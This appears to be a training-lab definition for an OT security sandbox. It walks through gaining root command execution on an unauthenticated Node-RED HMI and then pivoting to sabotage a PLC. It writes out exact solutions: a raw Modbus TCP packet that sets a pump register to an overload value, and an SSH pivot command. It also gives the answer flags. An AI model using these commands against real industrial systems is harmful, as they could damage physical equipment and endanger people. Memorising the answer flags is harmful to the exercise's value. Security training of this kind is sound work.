@@ -1,0 +1,112 @@
+{
+  "title": "Operation Flow: Simple OT Hijack and Sabotage",
+  "description": "A foundational industrial security sandbox demonstrating unauthenticated HMI exploitation and pivot-based Modbus TCP protocol hijacking in a segmented OT network.",
+  "prerequisites": [],
+  "outcomes": [
+    "Identify default ports and interfaces for industrial SCADA and PLC control services.",
+    "Exploit unauthenticated HMI services to gain RCE.",
+    "Pivot through a gateway firewall to perform Modbus network injection and OT sabotage."
+  ],
+  "state": "RELEASED",
+  "show_stepper_bar": true,
+  "levels": [
+    {
+      "title": "FOOTHOLD: Welcome to the OT Sandbox",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 1,
+      "minimal_possible_solve_time": null,
+      "content": "# Operational Technology (OT) Sandbox\n\nWelcome to the Simple OT Simulation Sandbox!\n\nThis training introduces standard industrial networks and SCADA control panels. You are provided with:\n* An **Attacker Machine (`attacker-host`)** running Kali Linux.\n* A **SCADA HMI Web Portal (`scada-hmi`)** running Node-RED (Purdue Level 2).\n* A **Software PLC Node (`openplc-node`)** running OpenPLC v3 (Purdue Level 1)."
+    },
+    {
+      "title": "FOOTHOLD: Access the Attacker Host",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 2,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Your first task is to access the Kali Linux GUI console.\n\n### Access Instructions:\n1. On the topology graph, select **`attacker-host`**.\n2. Click the **Web Console** link to open a new tab containing the Guacamole interface.\n3. Submit the passkey **`start`** to unlock the next level.",
+      "local_content": "Submit the passkey **`start`** to unlock the next level."
+    },
+    {
+      "title": "EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Hack)",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": null,
+      "answer": "FLAG{SCADA_EXPLOITED_RCE}",
+      "answer_variable_name": null,
+      "content": "### The Situation\n\nDirect network access to the PLC subnet is blocked from the attacker host by the gateway firewall. However, the SCADA HMI is accessible over the operations network.\n\nThis maps to the **2021 Oldsmar, Florida water breach**, where attackers leveraged exposed human-machine control services to manipulate physical dosing levels.\n\n### Your Objective\n\n1. From Kali, connect to the unauthenticated Node-RED graphical flow editor on the HMI at `http://10.10.10.10:1880/`.\n2. Leverage the workspace to drag nodes that execute system-level commands as `root` (RCE).\n3. Read the flag file located at `/root/flag.txt` on the HMI server.",
+      "solution": "1. Connect to the Node-RED HMI editor: http://10.10.10.10:1880/\n2. Drag inject, exec, and debug nodes onto the canvas and wire them: inject -> exec -> debug.\n3. Configure the exec node command field with: cat /root/flag.txt\n4. Click Deploy and click the inject node's trigger button. Read the flag in the Debug panel.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "Node-RED Shell Execution Concept",
+          "content": "Look at the left-hand node palette under the 'advanced' category for the 'exec' node, which executes system shell commands. You can trigger it using an 'inject' node, and view its stdout using a 'debug' node wired to the top output port of the exec node.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Flag File Path Nudge",
+          "content": "Configure the 'exec' node command string to read the flag at `/root/flag.txt`. Drag an 'inject' node, wire its output to the input of the 'exec' node, wire a 'debug' node to the top output of the 'exec' node, deploy the flow, and click the inject button.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Exact Foothold Command",
+          "content": "Set the exec command field to exactly: `cat /root/flag.txt` and trigger it to retrieve the flag.",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    },
+    {
+      "title": "SABOTAGE: Modbus Protocol Hijack (Industroyer / Stuxnet)",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": null,
+      "answer": "FLAG{OT_SABOTAGE_SUCCESS}",
+      "answer_variable_name": null,
+      "content": "### The Situation\n\nDue to firewall rules configured on the gateway router, your Kali host `attacker-host` cannot talk to the PLC (`192.168.99.10`) on Modbus port `502` or Admin port `8080`. However, the compromised SCADA HMI host `scada-hmi` (`10.10.10.10`) is allowed to communicate with it.\n\n### Your Objective\n\n1. From the compromised HMI, send a Modbus TCP write request to the PLC (`192.168.99.10:502`) to set **Holding Register 0** (the pump speed) to the overload sabotage value **`9999`**.\n2. Once zeroed/overloaded, the safety monitor daemon on the PLC will write the validation flag to `/root/flag2.txt` on the PLC.\n3. Pivot through your HMI connection to retrieve the flag from `/root/flag2.txt` on the PLC.",
+      "solution": "1. Use Node-RED on the HMI to execute a python one-liner script that sends a raw Modbus TCP write packet: `python3 -c \"import socket; s=socket.socket(); s.connect(('192.168.99.10',502)); s.sendall(b'\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x00\\x27\\x0f'); s.recv(1024); s.close()\"`.\n2. Read the flag file on the PLC by executing: `ssh -o StrictHostKeyChecking=no debian@192.168.99.10 \"sudo cat /root/flag2.txt\"`.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "Constructing Modbus TCP Bytes",
+          "content": "To write `9999` (hex `0x270F`) to holding register `0` using Modbus TCP Function Code `06` (Write Single Register), the raw protocol bytes are:\n`\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x00\\x27\\x0f`\nYou can send these bytes directly over a TCP socket to port 502 on `192.168.99.10` using Python's socket library.",
+          "hint_penalty": 0,
+          "order": 0
+        },
+        {
+          "title": "Executing SSH Pivot Command",
+          "content": "The HMI and PLC nodes share SSH authentication keys. To read the flag, use the Node-RED exec node to run an SSH command from the HMI connecting to the PLC user `debian` at `192.168.99.10` and outputting `/root/flag2.txt` using sudo privilege.",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Exact Pivot & Sabotage Commands",
+          "content": "1. Set the Node-RED exec command to inject the packet:\n`python3 -c \"import socket; s=socket.socket(); s.connect(('192.168.99.10',502)); s.sendall(b'\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x00\\x27\\x0f'); s.recv(1024); s.close()\"`\n2. Set the Node-RED exec command to fetch the flag:\n`ssh -o StrictHostKeyChecking=no debian@192.168.99.10 \"sudo cat /root/flag2.txt\"`",
+          "hint_penalty": 0,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [],
+      "expected_commands": [],
+      "commands_required": false
+    }
+  ]
+}
